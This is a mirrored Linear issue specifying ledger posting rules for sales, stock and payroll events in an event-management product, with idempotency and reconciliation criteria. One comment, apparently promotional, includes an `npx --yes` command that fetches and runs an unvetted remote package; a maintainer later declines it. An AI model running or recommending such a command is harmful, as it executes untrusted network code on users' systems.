<!-- linear:generated:start -->
# EVE-90: F11.2 Build posting rules that turn sales, stock and payroll events into journals

[Live Linear source](https://linear.app/resnovas/issue/EVE-90/f112-build-posting-rules-that-turn-sales-stock-and-payroll-events-into) | [Issue index](README.md) | [Maintained timeline](../timeline.md)

Snapshot: 2026-11-17; Linear updated: 2026-11-16T18:50:45.159Z. Generated source mirror; edit Linear and refresh, not this region.

| Field | Value |
| --- | --- |
| Status | Backlog (backlog) |
| Priority | 0: No priority |
| Labels | Decision: Audit needed, Delivery: Implementation pending |
| Project | Eventiva product features |
| Archived | No |
| Parent | [EVE-69](EVE-69.md) |
| Children | None recorded |
| Blocked by | [EVE-45](EVE-45.md), [EVE-54](EVE-54.md), [EVE-74](EVE-74.md) |
| Blocks | [EVE-126](EVE-126.md), [EVE-127](EVE-127.md), [EVE-160](EVE-160.md) |
| Related to | [EVE-18](EVE-18.md), [EVE-61](EVE-61.md), [EVE-63](EVE-63.md), [EVE-96](EVE-96.md), [EVE-157](EVE-157.md) |
| Duplicate of | None recorded |

## Publication omissions and authority

Enumerated visible EVE set: 259; mirrored: 258. Enumeration timestamp: 2026-11-17T07:42:41.684Z. EVE-10 is deliberately excluded under Jonathan's 2026-11-17 instruction because it belongs to a different repository; its Linear/GitHub records are not deleted by this tool. The identifier hash above, when shown, covers mirrored issues only.

Descriptions and all returned comment pages are synchronized verbatim, except reserved generation-marker escaping. Acceptance criteria, prose blockers and decisions stay in their source context below; no approval is inferred from a label, status, author name or automated summary. The latest binding owner comment governs until the human timeline/decision index is updated. Missing authors are marked unavailable; no comments means a successfully enumerated empty connection. Attachment titles are retained when supplied by the acquisition service, but binary content and short-lived signed download URLs are not mirrored. Follow the live source to download attachments; linked external documents and deleted/inaccessible comments are not proven captured.

## Linear description

## Goal

Every money event from another feature set posts to the ledger exactly once, through editable posting rules, with no feature set writing journals itself.

## Context

* Parent [EVE-69](<https://linear.app/resnovas/issue/EVE-69/f11-accounting-ledgers-invoices-bills-event-budgets-and-tax>) sections 4 and 8. Builds on F11.1 ([EVE-74](<https://linear.app/resnovas/issue/EVE-74/f111-build-the-ledger-port-chart-of-accounts-journals-and-periods>)) and the change feed ([EVE-45](<https://linear.app/resnovas/issue/EVE-45/p16-build-the-change-flow-domain-events-and-a-durable-resource-change>)). Durable consumption runs on Effect Cluster ([EVE-54](<https://linear.app/resnovas/issue/EVE-54/p18c-build-durable-agent-runs-on-effect-cluster-and-workflow>)); sharding decisions from [EVE-18](<https://linear.app/resnovas/issue/EVE-18/s5-verify-sharding-across-two-independent-runners-with-drain-and>) apply.
* Agreed inputs from other sets (2026-11-01):
  * F9 sales: `sales:order_paid`, `sales:refund_completed`, `sales:payment_fee_recorded`, `sales:payout_settled`, `sales:register_session_closed` (cash over or short). Each carries order id, F1 Event id, channel, lines with net, F11 tax code id and tax amount in integer minor units, currency and provider payout id.
  * F6 warehousing ([EVE-63](<https://linear.app/resnovas/issue/EVE-63/f6-warehousing-and-inventory-equipment-stock-availability-purchasing>)): `inventory:goods_received` per receipt (PO line ids, quantities, unit cost, F1 Event id, supplier) and `inventory:valuation_exported` per period (depreciation, average-cost movements, asset additions and retirements, write-offs).
  * F8 ticketing: ticket sales arrive through F9 orders unless F8 states otherwise on its parent issue.
  * F12 payroll (<issue id="335d2890-1b10-44eb-89f0-b9a032afacfa" label="EVE-61" href="https://linear.app/resnovas/issue/EVE-61/f12-payroll-pay-staff-and-crew-from-rosters-and-approved-timesheets" />, emitted by <issue id="a060ed52-422b-4a20-ba8e-cc47ca2a79de" label="EVE-96" href="https://linear.app/resnovas/issue/EVE-96/f127-build-the-payments-file-and-the-pay-run-events-for-accounting" />, agreed 2026-11-01): `payroll:run_approved` once per run when it completes, idempotency key = run id, with pay date, period, and per F1 Event, Phase and Department the gross pay, employer NI, employer pension, employee deductions (PAYE, employee NI, pension, student loan, other) and net pay in integer minor units with currency, plus a separate freelancer self-bill totals block. `payroll:run_reversed` carries correcting amounts in the same shape and posts as a reversal. F12 posts no journals; RTI filing sits with the payroll provider, not F11 or F12.

## Scope

1. `PostingRule` entity, versioned, mapping source event type and conditions (channel, product category, tax code) to debit and credit accounts and dimension values (F1 Event, F1 Event phase).
2. Consumer per source event type, idempotent by source event id: a replayed event posts nothing new. Failures go to a posting exceptions queue with the typed reason (`NoMatchingRule`, `PeriodLocked`, `LedgerUnavailable`).
3. Default rules for a UK event business: ticket revenue, merchandise revenue, deferred revenue for tickets to future events (recognised on the F1 Event date), payment processor fees, payouts to bank clearing, cash over and short, GRNI, depreciation, payroll control accounts (wages expense, employer NI, pension, PAYE and NI liability, net wages control), freelancer self-bill payables.
4. Actions: `accounting.postingRule.list` / `update` (approval always), `accounting.postingException.list` / `retry` / `resolve`.
5. Settings screen for posting rules and an exceptions list, both with projections and bound controls.

## Acceptance criteria

* Replay of the same 500 events twice produces the same ledger balances as one pass (idempotency test).
* A ticket sold for a future F1 Event posts to deferred revenue, then moves to revenue on the event date by a scheduled job.
* An event with no matching rule lands in exceptions and posts after a rule is added and the exception retried.
* Runner loss mid-batch (two runners, as in <issue id="37a1be99-529e-478c-a187-48c120672aeb" label="EVE-18" href="https://linear.app/resnovas/issue/EVE-18/s5-verify-sharding-across-two-independent-runners-with-drain-and" />) loses and duplicates nothing.

## Posting integrity clarifications (2026-11-16)

These clarify the existing F11.2 scope; they do not introduce a new ledger engine, provider integration, dependency, or event type.

* At posting time, persist the resolved account IDs, dimensions, source event ID, applied posting-rule ID/version, and entry kind on the immutable journal/posting audit record. Later rule edits or account renames must not rewrite posted history; corrections use the existing reversal mechanism.
* Before atomic persistence, validate that debit and credit totals balance exactly in currency-specific integer minor units, with no floating-point conversion. Preserve <issue id="f12d2c25-0d77-425f-b610-f66d2ad99b32" label="EVE-74" href="https://linear.app/resnovas/issue/EVE-74/f111-build-the-ledger-port-chart-of-accounts-journals-and-periods" />'s multi-currency precision model (including zero- and three-decimal currencies). Enforce durable, tenant-scoped uniqueness of the logical posting effect by source event and entry kind, including rule-revision/retry races; rule version is audit metadata, not a way to permit reposting the same effect. Legitimate distinct entries and reversals must remain possible with stable identities.
* Preserve separate journal lines or traceable allocations for gross receipts, tax liabilities, processor fees, refunds and clearing/bank settlements, so net payouts can be reconciled to underlying source transactions across orders and periods. Keep jurisdiction-specific tax reporting and external accounting exports in their existing feature scopes.

Additional acceptance checks:

* Editing a posting rule or renaming an account after posting leaves historical account references, amounts, dimensions and balances unchanged; an explicit reversal remains auditable.
* Concurrent duplicate deliveries, retries after runner loss, and posting-rule version changes produce no duplicate logical postings; all generated journals balance exactly, including GBP, JPY and BHD precision cases.
* A payout spanning multiple orders and accounting periods, with fees, tax and refunds, reconciles gross source amounts to net bank settlement without an unexplained residual.

## Constraints

Effect-TS v3; no new dependency; posting runs server-side only; flag `f11-accounting`; ship to main with `node --run check` results pasted here.

## Done signal

Merged with the idempotency and runner-loss tests green, and the default rule table posted here as a comment.

## Linear comments (3)

### Comment b4bee358-1056-4bc2-803f-f0119edcb9a4

Author: GitHub. Created: 2026-11-01T13:07:14.935Z; updated: 2026-11-01T13:07:14.911Z. [Live discussion source](https://linear.app/resnovas/issue/EVE-90/f112-build-posting-rules-that-turn-sales-stock-and-payroll-events-into) (comment ID above). Parent: None. Resolved: Not recorded.

This comment thread is synced to a corresponding [GitHub issue](https://github.com/Resnovas/Eventiva/issues/857). All replies are displayed in both locations.


### Comment 065c3add-71db-4c81-a071-fc67c42945c5

Author: GitHub. Created: 2026-11-16T07:32:23.000Z; updated: 2026-11-16T07:32:23.000Z. [Live discussion source](https://linear.app/resnovas/issue/EVE-90/f112-build-posting-rules-that-turn-sales-stock-and-payroll-events-into) (comment ID above). Parent: b4bee358-1056-4bc2-803f-f0119edcb9a4. Resolved: Not recorded.

Keeping posting rules declarative outside individual feature sets is the cleanest way to avoid scattered, un-auditable journal writes.

A few patterns that make editable posting-rule engines resilient in production:

1. **Immutable account-ID snapshots**: Store the resolved `clearing_account_id` / GL target on each generated journal batch at post time (so editing a posting rule or renaming a GL account next quarter never retroactively rewrites historical closed journals).
2. **Exact integer-cents balance assertion**: Require every rule output bundle to satisfy `sum(debits_cents) == sum(credits_cents)` plus an explicit `(source_event_id, rule_version, entry_kind)` idempotency constraint before persisting.
3. **Separate gross, fee, tax, and cutoff lines**: Keep gross revenue, platform fees, withheld taxes, and payout deposits distinct so downstream `Form 1099-K Box 1a` / bank-feed reconciliations tie out without manual journal adjustments.

If a deterministic multi-channel clearing reference helps as you design CSV/API journal outputs (`QBO` / `Xero`):

* Integer-cent tie-out Gist: [https://gist.github.com/hadesloc/5a0977bbf9945ab6f70588af372fd587](<https://gist.github.com/hadesloc/5a0977bbf9945ab6f70588af372fd587>)
* Local CLI (`v1.4.0`): `npx --yes --package=https://github.com/hadesloc/pdfua-ada-checker/releases/download/v1.4.0/clearstream-1099k-cli-1.4.0.tgz clearstream-1099k --help`
* Free browser template reference: [https://hadesloc.github.io/pdfua-partner-desk/ebay-etsy-1099-k-clearing-account-template/](<https://hadesloc.github.io/pdfua-partner-desk/ebay-etsy-1099-k-clearing-account-template/>) (offline kit 50% off w/ `EARLY50`: [https://pdfuapartnerdesk.gumroad.com/l/tiktok-1099k-clearing-kit/EARLY50?wanted=true](<https://pdfuapartnerdesk.gumroad.com/l/tiktok-1099k-clearing-kit/EARLY50?wanted=true>)).

*(Pure-software engineering comment — deterministic ledger formatting software only, not CPA, accounting, or legal advice.)*


### Comment 3b6caf28-6c0c-427e-bb4c-51aa94af312b

Author: jonathan@resnovas.com. Created: 2026-11-16T18:50:45.221Z; updated: 2026-11-16T18:50:45.159Z. [Live discussion source](https://linear.app/resnovas/issue/EVE-90/f112-build-posting-rules-that-turn-sales-stock-and-payroll-events-into) (comment ID above). Parent: b4bee358-1056-4bc2-803f-f0119edcb9a4. Resolved: Not recorded.

Thanks @hadesloc for taking the time to review the F11.2 posting-rule design. Your technical observations were useful.

For transparency, we're replacing the original comment with this project-maintained summary because it combined architectural feedback with links to an executable third-party package, external templates and a commercial offer. We keep issue discussions focused on reviewable requirements and avoid promoting unvetted software or purchase links. This is a repository-hygiene decision, not a dismissal of your contribution.

**Technical excerpts from your feedback (promotional links omitted):**
> “Immutable account-ID snapshots”
>
> “Exact integer-cents balance assertion”
>
> “Separate gross, fee, tax, and cutoff lines”

**What we incorporated into [EVE-90](https://linear.app/resnovas/issue/EVE-90):**
1. Persist resolved account IDs, dimensions and applied posting-rule version with immutable posting history, so later account renames or rule changes cannot alter closed journals.
2. Strengthen exact debit/credit balancing and durable idempotency tests across concurrent deliveries, rule revisions, retries and reversals. We use currency-aware integer *minor units*, not fixed cents, to retain the existing GBP/JPY/BHD model. Importantly, rule version is audit metadata rather than part of a uniqueness key that could permit the same logical posting twice.
3. Add gross-to-net reconciliation acceptance checks covering tax, processor fees, refunds, clearing and payouts spanning multiple orders or accounting periods.

These are scoped clarifications to the already approved F11.2/F11.1 ledger architecture, not new feature sets or dependencies. The US-specific Form 1099-K treatment, external CLI, templates and paid materials are not being adopted.

Thank you again for the constructive engineering input — it has directly improved the precision of our acceptance criteria.
<!-- linear:generated:end -->

## Repository context (human-maintained)

Add implementation notes here, with source links. This section never grants owner approval.
